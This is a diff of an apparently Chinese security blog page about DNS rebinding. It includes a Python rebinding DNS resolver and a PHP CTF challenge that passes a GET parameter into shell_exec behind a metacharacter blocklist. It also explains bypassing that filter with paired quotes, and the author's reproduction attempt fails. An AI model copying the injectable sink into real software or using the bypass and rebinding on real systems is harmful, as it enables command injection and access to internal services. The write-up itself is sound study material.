@@ -58,7 +58,7 @@
 <li>再添加一个ns记录，域名是rebind.xyz.pw，指向ns.xyz.pw</li>
 </ul>
 <p>此时在A服务器上运行脚本:</p>
-<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">twisted.internet</span> <span class="kn">import</span> <span class="n">reactor</span><span class="p">,</span> <span class="n">defer</span>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">twisted.internet</span> <span class="kn">import</span> <span class="n">reactor</span><span class="p">,</span> <span class="n">defer</span>
 <span class="kn">from</span> <span class="nn">twisted.names</span> <span class="kn">import</span> <span class="n">client</span><span class="p">,</span> <span class="n">dns</span><span class="p">,</span> <span class="n">error</span><span class="p">,</span> <span class="n">server</span>
 <span class="n">record</span><span class="o">=</span><span class="p">{}</span>
 <span class="k">class</span> <span class="nc">DynamicResolver</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
@@ -94,43 +94,43 @@
     <span class="n">reactor</span><span class="o">.</span><span class="n">run</span><span class="p">()</span>
 <span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
     <span class="k">raise</span> <span class="ne">SystemExit</span><span class="p">(</span><span class="n">main</span><span class="p">())</span>
-</pre></div>
+</code></pre></div>
 
 
 <p>此时，在Linux上面运行：</p>
-<div class="highlight"><pre><span></span><span class="n">dig</span> <span class="mf">@8.8.8.8</span> <span class="n">rebind</span><span class="p">.</span><span class="n">xyz</span><span class="p">.</span><span class="n">pw</span>
+<div class="highlight"><pre><span></span><code><span class="n">dig</span> <span class="mf">@8.8.8.8</span> <span class="n">rebind</span><span class="p">.</span><span class="n">xyz</span><span class="p">.</span><span class="n">pw</span>
 <span class="err">返回结果是</span><span class="n">A主机的IP</span>
 
 <span class="err">再次运行上面的命令</span><span class="o">:</span>
 <span class="n">dig</span> <span class="mf">@8.8.8.8</span> <span class="n">rebind</span><span class="p">.</span><span class="n">xyz</span><span class="p">.</span><span class="n">pw</span>
 <span class="err">返回结果是</span><span class="mf">127.0.0.1</span>
-</pre></div>
+</code></pre></div>
 
 
 <h3>TIPS</h3>
 <p>以下是从joychou大神博客来的：
 在Linux，默认不会进行DNS缓存，除非运行nscd，dnsmaq等。</p>
 <p>另外一个是Ph牛出的与dns有关的题目:</p>
-<div class="highlight"><pre><span></span><span class="o">&lt;</span>?<span class="nv">php</span>
-<span class="nv">header</span><span class="ss">(</span><span class="s1">&#39;</span><span class="s">Content-Type: text/plain</span><span class="s1">&#39;</span><span class="ss">)</span><span class="c1">;</span>
-$<span class="nv">ip</span> <span class="o">=</span> $<span class="nv">_GET</span>[<span class="s1">&#39;</span><span class="s">ip</span><span class="s1">&#39;</span>]??<span class="k">exit</span><span class="c1">;</span>
-<span class="nv">duita</span><span class="ss">(</span>$<span class="nv">ip</span><span class="ss">)</span><span class="c1">;</span>
-$<span class="nv">ip</span> <span class="o">=</span> <span class="nv">escapeshellcmd</span><span class="ss">(</span>$<span class="nv">ip</span><span class="ss">)</span><span class="c1">;</span>
-$<span class="nv">ip</span> <span class="o">=</span> <span class="nv">str_replace</span><span class="ss">(</span><span class="s1">&#39;</span><span class="s">\&gt;</span><span class="s1">&#39;</span>, <span class="s1">&#39;</span><span class="s">&gt;</span><span class="s1">&#39;</span>, $<span class="nv">ip</span><span class="ss">)</span><span class="c1">;</span>
-$<span class="nv">ip</span> <span class="o">=</span> <span class="nv">str_replace</span><span class="ss">(</span><span class="s1">&#39;</span><span class="s">\&lt;</span><span class="s1">&#39;</span>, <span class="s1">&#39;</span><span class="s">&lt;</span><span class="s1">&#39;</span>, $<span class="nv">ip</span><span class="ss">)</span><span class="c1">;</span>
-<span class="mh">$c</span><span class="nv">md</span> <span class="o">=</span> <span class="k">sprintf</span><span class="ss">(</span><span class="s1">&#39;</span><span class="s">ping -c 2 %s</span><span class="s1">&#39;</span>, $<span class="nv">ip</span><span class="ss">)</span><span class="c1">;</span>
-<span class="nv">echo</span> <span class="nv">shell_exec</span><span class="ss">(</span><span class="mh">$c</span><span class="nv">md</span><span class="ss">)</span><span class="c1">;</span>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+<span class="nb">header</span><span class="p">(</span><span class="s1">&#39;Content-Type: text/plain&#39;</span><span class="p">);</span>
+<span class="nv">$ip</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ip&#39;</span><span class="p">]</span><span class="o">??</span><span class="k">exit</span><span class="p">;</span>
+<span class="nx">duita</span><span class="p">(</span><span class="nv">$ip</span><span class="p">);</span>
+<span class="nv">$ip</span> <span class="o">=</span> <span class="nb">escapeshellcmd</span><span class="p">(</span><span class="nv">$ip</span><span class="p">);</span>
+<span class="nv">$ip</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">&#39;\&gt;&#39;</span><span class="p">,</span> <span class="s1">&#39;&gt;&#39;</span><span class="p">,</span> <span class="nv">$ip</span><span class="p">);</span>
+<span class="nv">$ip</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">&#39;\&lt;&#39;</span><span class="p">,</span> <span class="s1">&#39;&lt;&#39;</span><span class="p">,</span> <span class="nv">$ip</span><span class="p">);</span>
+<span class="nv">$cmd</span> <span class="o">=</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s1">&#39;ping -c 2 %s&#39;</span><span class="p">,</span> <span class="nv">$ip</span><span class="p">);</span>
+<span class="k">echo</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span>
 
-<span class="nv">function</span> <span class="nv">duita</span><span class="ss">(</span>$<span class="nv">ip</span><span class="ss">)</span>
-{
-    <span class="k">if</span><span class="ss">(</span><span class="nv">strpbrk</span><span class="ss">(</span>$<span class="nv">ip</span>, <span class="s2">&quot;</span><span class="s">&amp;;`|*?()$</span><span class="se">\\</span><span class="s">\x00</span><span class="s2">&quot;</span><span class="ss">)</span> <span class="o">!==</span> <span class="nv">false</span><span class="ss">)</span> {
-        <span class="k">exit</span><span class="ss">(</span><span class="s1">&#39;</span><span class="s">WAF</span><span class="s1">&#39;</span><span class="ss">)</span><span class="c1">;</span>
-    }
-    <span class="k">if</span><span class="ss">(</span><span class="nv">stripos</span><span class="ss">(</span>$<span class="nv">ip</span>, <span class="s1">&#39;</span><span class="s">.php</span><span class="s1">&#39;</span><span class="ss">)</span> <span class="o">!==</span> <span class="nv">false</span><span class="ss">)</span> {
-        <span class="k">exit</span><span class="ss">(</span><span class="s1">&#39;</span><span class="s">WAF</span><span class="s1">&#39;</span><span class="ss">)</span><span class="c1">;</span>
-    }
-}
-</pre></div>
+<span class="k">function</span> <span class="nf">duita</span><span class="p">(</span><span class="nv">$ip</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">if</span><span class="p">(</span><span class="nb">strpbrk</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span> <span class="s2">&quot;&amp;;`|*?()</span><span class="si">$\\\x00</span><span class="s2">&quot;</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">exit</span><span class="p">(</span><span class="s1">&#39;WAF&#39;</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">if</span><span class="p">(</span><span class="nb">stripos</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span> <span class="s1">&#39;.php&#39;</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">exit</span><span class="p">(</span><span class="s1">&#39;WAF&#39;</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
 
 
 <ul>
@@ -138,7 +138,7 @@ $<span class="nv">ip</span> <span class="o">=</span> <span class="nv">str_replac
 <li><code>"</code> <code>'</code>在成对的情况下escapeshellcmd是不会过滤的，所以<code>.p''php</code>绕过waf</li>
 </ul>
 <p>搭建一个dns服务器:</p>
-<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">datetime</span>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">datetime</span>
 <span class="kn">import</span> <span class="nn">sys</span>
 <span class="kn">import</span> <span class="nn">time</span>
 <span class="kn">import</span> <span class="nn">threading</span>
@@ -219,11 +219,11 @@ $<span class="nv">ip</span> <span class="o">=</span> <span class="nv">str_replac
     <span class="k">finally</span><span class="p">:</span>
         <span class="k">for</span> <span class="n">s</span> <span class="ow">in</span> <span class="n">servers</span><span class="p">:</span>
             <span class="n">s</span><span class="o">.</span><span class="n">shutdown</span><span class="p">()</span>
-</pre></div>
+</code></pre></div>
 
 
 <p>这样：</p>
-<div class="highlight"><pre><span></span><span class="nx">dig</span> <span class="nx">rebind</span><span class="p">.</span><span class="nx">xyz</span><span class="p">.</span><span class="nx">pw的时候其中的cname是shell</span><span class="err">，</span><span class="nx">但是本地ping的时候出现uknow</span> <span class="nx">host的错误</span>
+<div class="highlight"><pre><span></span><code><span class="nx">dig</span> <span class="nx">rebind</span><span class="p">.</span><span class="nx">xyz</span><span class="p">.</span><span class="nx">pw的时候其中的cname是shell</span><span class="err">，</span><span class="nx">但是本地ping的时候出现uknow</span> <span class="nx">host的错误</span>
  <span class="nx">dig</span> <span class="nx">rebind</span><span class="p">.</span><span class="nx">xyz</span><span class="p">.</span><span class="nx">pw</span>
 
 <span class="p">;</span> <span class="o">&lt;&lt;&gt;&gt;</span> <span class="nx">DiG</span> <span class="mf">9.8.3</span><span class="o">-</span><span class="nx">P1</span> <span class="o">&lt;&lt;&gt;&gt;</span> <span class="nx">rebind</span><span class="p">.</span><span class="nx">xyz</span><span class="p">.</span><span class="nx">pw</span>
@@ -245,7 +245,7 @@ $<span class="nv">ip</span> <span class="o">=</span> <span class="nv">str_replac
 
 
 <span class="nx">复现失败</span>
-</pre></div>
+</code></pre></div>
 
 
 <p>======
